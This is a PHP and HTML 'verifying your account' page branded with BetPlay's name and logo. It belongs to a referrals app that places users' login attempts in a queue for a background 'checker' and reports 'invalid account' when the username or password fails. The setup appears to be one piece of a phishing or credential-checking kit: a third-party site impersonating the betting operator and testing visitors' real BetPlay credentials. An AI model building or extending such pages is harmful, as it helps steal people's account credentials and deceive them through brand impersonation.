<?php
declare(strict_types=1);
require_once __DIR__ . '/referidos/lib/db.php';
require_once __DIR__ . '/referidos/lib/helpers.php';
if (session_status() !== PHP_SESSION_ACTIVE) session_start();

$uid = (int)($_SESSION['uid'] ?? 0);
if ($uid <= 0) { header('Location: /index.php'); exit; }

$pdo = db();
$st = $pdo->prepare('SELECT id, cedula, estado FROM usuarios WHERE id = ? LIMIT 1');
$st->execute([$uid]);
$u = $st->fetch();
if (!$u) { $_SESSION = []; session_destroy(); header('Location: /index.php'); exit; }

$estado = (string)$u['estado'];
$ref    = (string)($_SESSION['ref'] ?? '');
$urlIndex = '/index.php' . ($ref !== '' ? '?ref=' . urlencode($ref) : '');

// Ya verificado -> al panel (ahí sale el popup de bienvenida)
if ($estado === 'verificado') { unset($_SESSION['verif_inicio']); header('Location: /referidos/panel.php'); exit; }

// Cuenta inválida -> popup SIN boton; a los 3s redirige al index
$invalido = ($estado === 'invalido');

// ---- control de tiempo: solo si NO hay resultado (timeout) ----
if (!$invalido) {
    if (!isset($_SESSION['verif_inicio'])) $_SESSION['verif_inicio'] = time();
    $transcurrido = time() - (int)$_SESSION['verif_inicio'];

    // si el checker la está trabajando damos más tiempo; si quedó pendiente es que está caído
    $r = $pdo->prepare('SELECT estado FROM cola WHERE usuario_id=? ORDER BY id DESC LIMIT 1');
    $r->execute([$uid]);
    $colaEstado = (string)($r->fetchColumn() ?: '');
    $limite = ($colaEstado === 'procesando') ? 90 : 30;

    if ($transcurrido >= $limite) {
        $r2 = $pdo->prepare('SELECT id FROM cola WHERE usuario_id=? ORDER BY id DESC LIMIT 1');
        $r2->execute([$uid]); $cid = (int)$r2->fetchColumn();
        if ($cid > 0) {
            $pdo->prepare('UPDATE cola SET estado="pendiente", motivo=NULL, actualizado_en=datetime("now") WHERE id=?')->execute([$cid]);
        }
        $_SESSION['verif_inicio'] = time();   // reinicia y SIGUE cargando (sin redirigir)
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Verificando tu cuenta - BetPlay</title>
<?php if ($invalido): ?>
  <meta http-equiv="refresh" content="3;url=<?= htmlspecialchars($urlIndex) ?>">
<?php else: ?>
  <meta http-equiv="refresh" content="2">
<?php endif; ?>
<link rel="icon" type="image/x-icon" href="/favicon.ico?v=1.1.0">
<style>
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
       background:#002361;font-family:Montserrat,Roboto,Arial,sans-serif;padding:20px}
  .card{background:#fff;border-radius:18px;max-width:400px;width:100%;padding:34px 26px;text-align:center;
        box-shadow:0 24px 60px rgba(0,0,0,.4)}
  .logo{height:40px;margin-bottom:18px}
  .spin{width:64px;height:64px;margin:6px auto 20px;border:6px solid #e3e7ee;border-top-color:#00ae42;
        border-radius:50%;animation:g 1s linear infinite}
  @keyframes g{to{transform:rotate(360deg)}}
  .t{color:#002361;font-size:20px;font-weight:900;margin:0 0 8px}
  .s{color:#5b6270;font-size:14px;line-height:1.5;margin:0}
  .bar{height:8px;background:#e3e7ee;border-radius:50px;overflow:hidden;margin-top:22px}
  .bar > i{display:block;height:100%;width:40%;background:#00ae42;border-radius:50px;
           animation:sl 1.6s ease-in-out infinite}
  @keyframes sl{0%{margin-left:-40%}100%{margin-left:100%}}
  .ov{position:fixed;inset:0;background:rgba(0,24,73,.8);display:flex;align-items:center;justify-content:center;padding:18px;z-index:99999}
  .ovc{background:#fff;border-radius:18px;max-width:390px;width:100%;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.45)}
  .ovh{background:#f44336;color:#fff;padding:20px;text-align:center}
  .ovh .x{width:56px;height:56px;border-radius:50%;background:rgba(255,255,255,.2);display:flex;
          align-items:center;justify-content:center;font-size:30px;font-weight:900;margin:0 auto 10px}
  .ovh h3{margin:0;font-size:19px;font-weight:900}
  .ovb{padding:22px;text-align:center}
  .ovb p{color:#40454f;font-size:14px;line-height:1.5;margin:0}
  .ovb .ced{color:#002361;font-weight:700}
  .ovb .redir{color:#9aa1ac;font-size:12px;margin-top:12px}
</style>
</head>
<body>

<?php if ($invalido): ?>
  <div class="ov">
    <div class="ovc">
      <div class="ovh">
        <div class="x">!</div>
        <h3>Cuenta inválida</h3>
      </div>
      <div class="ovb">
        <p>Revisa que el usuario y la contraseña sean correctos e inténtalo de nuevo.</p>
        <p class="redir">Volviendo al inicio...</p>
      </div>
    </div>
  </div>
<?php else: ?>
  <div class="card">
    <img class="logo" src="/img/betcol.png" alt="BetPlay">
    <div class="spin"></div>
    <h1 class="t">Verificando tu cuenta</h1>
    <p class="s">Estamos validando tus datos. No cierres esta ventana, en unos segundos estarás listo.</p>
    <div class="bar"><i></i></div>
  </div>
<?php endif; ?>

</body>
</html>